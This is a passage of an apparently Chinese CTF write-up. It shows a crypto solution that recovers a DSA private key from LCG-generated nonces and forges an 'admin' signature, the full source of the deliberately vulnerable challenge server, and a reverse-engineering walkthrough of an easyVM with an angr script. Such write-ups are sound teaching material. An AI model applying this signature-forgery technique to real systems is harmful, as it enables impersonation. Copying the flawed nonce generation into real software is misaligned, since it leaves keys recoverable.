class="number">4</span>]):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">x = W[<span class="number">5</span>] * q / <span class="number">2</span></span><br><span class="line">k1 = W[<span class="number">6</span>] * c[<span class="number">9</span>] / <span class="number">2</span></span><br><span class="line">k2 = W[<span class="number">7</span>] * c[<span class="number">9</span>] / <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> pow(int(g), int(x), int(p)) == y</span><br><span class="line"></span><br><span class="line">print(<span class="string">"x = &#123;:d&#125;"</span>.format(int(x)))</span><br><span class="line">print(<span class="string">"k = &#123;:d&#125;"</span>.format(int(k1)))</span><br></pre></td></tr></table></figure>

<p>对<strong>admin</strong>签名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">p = <span class="number">130333458067095360348130950721230774751621761834488608409527025002236423782720410777827282553809013041996307514477632173973104508525268490069618923242342738301435251323204357581290464182936651741782879029384520572881285707893688816385746123467926351757503503539294480789448841461659407755817883221473523487973</span></span><br><span class="line">q = <span class="number">837755551167460257692787882189727780394726772833</span></span><br><span class="line">g = <span class="number">12024096372339682960526557683581436357293283215343997771131292478996528847320954685241633017653642652057102765310001443858062073122236510989249944118146042928920430149051644732814822161087549485840013542857240153830838022898248052043466838312870563425596026239434244567102769777073608663275001579392930228464</span></span><br><span class="line">y = <span class="number">108523596838679337654299921385592064511837579265203612271025521537067329951647895839430301754531744295124745776428649849251756635288111351922313014364522357798782309623603678075220735747170068419250544314336391208250408553893413488317640318013369036095801759257423651364411417495953742453694687368063103806873</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">0x66656E6752C56F15150995AA5819131C3C709AACA84C5633846074689A5E06C4F482218F8C76E5A0B6F54EC9</span></span><br><span class="line">b = <span class="number">0x6C694F19FD6115B512D4B9B08891EF4D98D0131DBCB65C5082A2E50D000F9709873B9DB7743A4F3466C7</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">526714742242008295998162007820673108223255742598</span></span><br><span class="line">k = <span class="number">597843802970261534007601903754583309912140797068</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_sign</span><span class="params">(m)</span>:</span></span><br><span class="line">    k_inv = number.inverse(k, q)</span><br><span class="line">    r = pow(g, k, p) % q</span><br><span class="line">    s = (k_inv * (m + x * r)) % q</span><br><span class="line">    <span class="keyword">return</span> map(int, (r, s))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_up</span><span class="params">(name)</span>:</span></span><br><span class="line">    m = bytes_to_long(name)</span><br><span class="line">    sig = _sign(m)</span><br><span class="line">    <span class="keyword">return</span> sig</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">b'admin'</span></span><br><span class="line">(r, s) = sign_up(name)</span><br><span class="line">sig = name + r.to_bytes(<span class="number">20</span>, <span class="string">'big'</span>) + s.to_bytes(<span class="number">20</span>, <span class="string">'big'</span>)</span><br><span class="line">print(sig.hex().upper().encode())</span><br></pre></td></tr></table></figure>

<p>get flag  <strong>flag{8213638b-3f00-46e4-8250-6ab802ee9906}</strong></p>
<p>题目</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> os, signal</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> string, binascii</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random, atfork</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span></span><br><span class="line"></span><br><span class="line">    _key = <span class="literal">None</span></span><br><span class="line">    _rand_iter = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span><span class="params">(self)</span>:</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> len(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self, msg, newline=True)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b'\n'</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span><span class="params">(self, prompt=<span class="string">b'&gt; '</span>)</span>:</span></span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">(self)</span>:</span></span><br><span class="line">        proof = <span class="string">''</span>.join(</span><br><span class="line">                    [ random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">20</span>) ]</span><br><span class="line">                    )</span><br><span class="line">        _hexdigest = sha256( proof.encode() ).hexdigest()</span><br><span class="line">        self.send(str.encode( <span class="string">"sha256(XXXX+%s) == %s"</span> % (proof[<span class="number">4</span>:], _hexdigest) ))</span><br><span class="line">        x = self.recv(prompt=<span class="string">b'Give me XXXX: '</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:].encode()).hexdigest() != _hexdigest:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">timeout_handler</span><span class="params">(self, signum, frame)</span>:</span></span><br><span class="line">        self.send(<span class="string">b"\n\nSorry, time out.\n"</span>)</span><br><span class="line">        <span class="keyword">raise</span> TimeoutError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lcg</span><span class="params">(self, seed, params)</span>:</span></span><br><span class="line">        (a, b, m) = params</span><br><span class="line"></span><br><span class="line">        x = seed % m</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            x = (a*x + b) % m</span><br><span class="line">            <span class="keyword">yield</span> x</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">genDSA</span><span class="params">(self)</span>:</span></span><br><span class="line">        q = number.getPrime(<span class="number">160</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            X = random.getrandbits(<span class="number">1024</span>)</span><br><span class="line">            c = X % (q * <span class="number">2</span>)</span><br><span class="line">            p = X - (c - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> number.isPrime(p) <span class="keyword">and</span> p.bit_length()==<span class="number">1024</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        e = (p - <span class="number">1</span>) // q</span><br><span class="line">        h = <span class="number">2</span></span><br><span class="line">        g = pow(h, e, p)</span><br><span class="line"></span><br><span class="line">        c = random.getrandbits(<span class="number">160</span>)</span><br><span class="line">        x = c % (q - <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">        y = pow(g, x, p)</span><br><span class="line"></span><br><span class="line">        self._key = &#123; <span class="string">'y'</span>:y, <span class="string">'g'</span>:g, <span class="string">'p'</span>:p, <span class="string">'q'</span>:q, <span class="string">'x'</span>:x &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_params</span><span class="params">(self, **params)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> kw <span class="keyword">in</span> params:</span><br><span class="line">            self.send(str.encode(<span class="string">f"<span class="subst">&#123;kw&#125;</span> = <span class="subst">&#123;params[kw]&#125;</span>"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_sign</span><span class="params">(self, m)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self._key:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"[*] DSA key is None"</span>)</span><br><span class="line"></span><br><span class="line">        k = next(self._rand_iter)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">1</span> &lt; k &lt; self._key[<span class="string">'q'</span>]):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"[*] k is not between 2 and q-1"</span>)</span><br><span class="line"></span><br><span class="line">        x, q, p, g = [self._key[comp] <span class="keyword">for</span> comp <span class="keyword">in</span> [<span class="string">'x'</span>, <span class="string">'q'</span>, <span class="string">'p'</span>, <span class="string">'g'</span>]]</span><br><span class="line"></span><br><span class="line">        k_inv = number.inverse(k, q)</span><br><span class="line"></span><br><span class="line">        r = pow(g, k, p) % q</span><br><span class="line">        s = (k_inv * (m + x * r)) % q</span><br><span class="line">        <span class="keyword">return</span> map(int, (r, s))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self, m, sig)</span>:</span></span><br><span class="line">        r, s = sig</span><br><span class="line">        y, q, p, g = [self._key[comp] <span class="keyword">for</span> comp <span class="keyword">in</span> [<span class="string">'y'</span>, <span class="string">'q'</span>, <span class="string">'p'</span>, <span class="string">'g'</span>]]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt; r &lt; q) <span class="keyword">or</span> <span class="keyword">not</span> (<span class="number">0</span> &lt; s &lt; q):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        w = number.inverse(s, q)</span><br><span class="line">        u1 = int((w * m) % q)</span><br><span class="line">        u2 = int((w * r) % q)</span><br><span class="line">        v = (pow(g, u1, p) * pow(y, u2, p) % p) % q</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v == r</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_is_valid_name</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt; len(name) &lt;= <span class="number">20</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"[*] name length inappropriate"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> string.printable.encode():</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">"[*] name is unprintable"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">b'admin'</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"[*] name is equal to 'admin'"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign_up</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self._is_valid_name(name):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        m = int.from_bytes(name, <span class="string">'big'</span>)</span><br><span class="line">        sig = self._sign(m)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sig</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign_in</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">assert</span> (<span class="number">40</span> &lt; len(data) &lt;= <span class="number">60</span>), <span class="string">"signature wrong length"</span></span><br><span class="line"></span><br><span class="line">        (name, r, s) = (data[:<span class="number">-40</span>], data[<span class="number">-40</span>:<span class="number">-20</span>], data[<span class="number">-20</span>:])</span><br><span class="line">        m, *sig = map(<span class="keyword">lambda</span> x: int.from_bytes(x, <span class="string">'big'</span>), (name, r, s))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self._verify(m, sig):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"Wrong signature"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        atfork()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            signal.signal(signal.SIGALRM, self.timeout_handler)</span><br><span class="line">            signal.alarm(<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">            daemon_thread = threading.Thread(target=self.genDSA, daemon=<span class="literal">True</span>)</span><br><span class="line">            daemon_thread.start()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">            daemon_thread.join()</span><br><span class="line"></span><br><span class="line">            self.send_params(p = self._key[<span class="string">'p'</span>],</span><br><span class="line">                             q = self._key[<span class="string">'q'</span>],</span><br><span class="line">                             g = self._key[<span class="string">'g'</span>],</span><br><span class="line">                             y = self._key[<span class="string">'y'</span>])</span><br><span class="line"></span><br><span class="line">            seed = random.getrandbits(<span class="number">160</span>)</span><br><span class="line">            a = self._key[<span class="string">'y'</span>] * <span class="number">233333</span> % self._key[<span class="string">'q'</span>]</span><br><span class="line">            b = self._key[<span class="string">'y'</span>] * <span class="number">0x2333</span> % self._key[<span class="string">'q'</span>]</span><br><span class="line">            m = self._key[<span class="string">'q'</span>]</span><br><span class="line">            self._rand_iter = self.lcg(seed, (a,b,m))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">                command = self.recv(prompt=<span class="string">b'$ '</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> command:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> command == <span class="string">b'sign up'</span>:</span><br><span class="line">                    self.send(<span class="string">b'Give me your username'</span>)</span><br><span class="line">                    name = self.recv()</span><br><span class="line">                    (r, s) = self.sign_up(name)</span><br><span class="line">                    sig = name + r.to_bytes(<span class="number">20</span>, <span class="string">'big'</span>) + s.to_bytes(<span class="number">20</span>, <span class="string">'big'</span>)</span><br><span class="line">                    self.send(<span class="string">b'Here is your signature(hex)'</span>)</span><br><span class="line">                    self.send(sig.hex().upper().encode())</span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> command == <span class="string">b'sign in'</span>:</span><br><span class="line">                    self.send(<span class="string">b'Give me your signature(hex)'</span>)</span><br><span class="line">                    hex_data = self.recv()</span><br><span class="line">                    data = binascii.unhexlify(hex_data)</span><br><span class="line">                    name = self.sign_in(data)</span><br><span class="line">                    self.send(str.encode(<span class="string">f"Welcome, <span class="subst">&#123;name.decode()&#125;</span>."</span>))</span><br><span class="line">                    <span class="keyword">if</span> name == <span class="string">b"admin"</span>:</span><br><span class="line">                        self.send(str.encode(<span class="string">f"The flag is <span class="subst">&#123;FLAG&#125;</span>."</span>))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            self.send(<span class="string">b'Bye~~'</span>)</span><br><span class="line">            self.request.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span><span class="params">(socketserver.ForkingMixIn, socketserver.TCPServer)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    HOST, PORT = <span class="string">'0.0.0.0'</span>, <span class="number">1234</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>



<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="easyVM"><a href="#easyVM" class="headerlink" title="easyVM"></a>easyVM</h3><p>逆指令，人肉汇编，直接口算flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">0x72, 0xDE, 0xC1, 0xD4, 0x6D, 0x58, 0x6B, 0x2D, 0x87, 0x69, 0xC8, 0x6E, 0xDC, 0x47, 0xD3, 0x61, 0xC6, 0x71, 0x29, 0x7D</span><br><span class="line">1, 101, 0, mov r1,flag[0]</span><br><span class="line">1, 102, 220, mov r2,220+56-256</span><br><span class="line">2, 101, 102, xor r1,r2</span><br><span class="line">1, 0, 101, 	mov flag[0],r1		f  </span><br><span class="line">1, 101, 1, mov r[1],flag[1]		</span><br><span class="line">3, 101, 0, add r1,check[0]	</span><br><span class="line">1, 1, 101, mov flag[1],r1		l</span><br><span class="line">1, 102, 1, mov r2,check[1]</span><br><span class="line">1, 101, 2, mov r1,flag[2]</span><br><span class="line">2, 101, 102, xor r1,r2</span><br><span class="line">5, 101, inc r1</span><br><span class="line">5, 101, inc r1</span><br><span class="line">1, 2, 101, mov flag[2],r1		a</span><br><span class="line">2, 3, 0, xor flag[3],check[0]</span><br><span class="line">2, 3, 2, xor flag[3],check[0]	g</span><br><span class="line">5, 4, inc flag[4]				</span><br><span class="line">4, 4, 215, sub flag[4],flag[4]-215-56+0x100		&#123;</span><br><span class="line">1, 102, 5, mov r2,flag[5]</span><br><span class="line">1, 101, 230, mov r1,0x1e</span><br><span class="line">4, 102, 101, sub r2,r1</span><br><span class="line">1, 5, 102, mov flag[5],r2		v</span><br><span class="line">6, 6, dec flag[6]</span><br><span class="line">6, 6, dec flag[6]				m</span><br><span class="line">1, 101, 0, mov r1,check[0]		</span><br><span class="line">2, 7, 101, xor flag[7],r1		_</span><br><span class="line">3, 8, 230, add flag[8],230+56	i</span><br><span class="line">4, 9, 210, sub flag[9],-210-56+0x100	s</span><br><span class="line">1, 101, 10, mov r1,flag[10]		</span><br><span class="line">1, 102, 9, mov r2,flag[9]</span><br><span class="line">3, 101, 102, sub r1,r2</span><br><span class="line">1, 10, 101, mov flag[10],r1		_</span><br><span class="line">6, 11, dec flag[11]	</span><br><span class="line">5, 11, inc flag[11]				n</span><br><span class="line">6, 12, dec flag[12]					</span><br><span class="line">3, 12, 12, add flag[12],flag[12]	o</span><br><span class="line">1, 101, 13, mov r1,flag[13]</span><br><span class="line">1, 102, 14, mov r2,flag[14]</span><br><span class="line">3, 102, 101, add r2,r1</span><br><span class="line">1, 14, 102, mov flag[14],r2    13+14 &#x3D; 0xd3</span><br><span class="line">3, 101, 102, add r1,r2			13+14+13 &#x3D; 0x147	</span><br><span class="line">1, 13, 101, mov flag[13],r1		t_</span><br><span class="line">1, 101, 15, mov r1,flag[15]</span><br><span class="line">1, 102, 16, mov r2,flag[16]</span><br><span class="line">3, 102, 101, add r2,r1</span><br><span class="line">1, 16, 102, mov flag[16],r2		15+16 &#x3D; c6</span><br><span class="line">4, 102, 101, sub r2,r1			15+15-15 &#x3D; 61</span><br><span class="line">1, 15, 102, mov flag[15],r2     ae</span><br><span class="line">6, 17, dec flag[17]		</span><br><span class="line">6, 17, dec flag[17]				sy</span><br><span class="line">4, 18, 240, sub flag[18],-240-56+0x100	</span><br><span class="line">4, 18, 240, sub flag[18],-240-56+0x100</span><br><span class="line">255</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag&#123;vm_is_not_easy&#125;</span><br></pre></td></tr></table></figure>
<p>当然更简单的就是angr一把梭，秒出答案</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">'./EasyVM'</span>)</span><br><span class="line">st = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(st)</span><br><span class="line"></span><br><span class="line">sm.explore(find = <span class="number">0x400b73</span>)</span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    print(sm.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>


<h3 id="babymac"><a href="#babymac" class="headerlink" title="babymac"></a>babymac</h3><p>mac逆向，mac虚拟机只剩一个压缩包在移动硬盘，解压完静态看完了(移动硬盘速度实慢)，就懒得动态了，很简单就一条方程，直接4个字节、4个字节爆flag完事，速度还行</p>
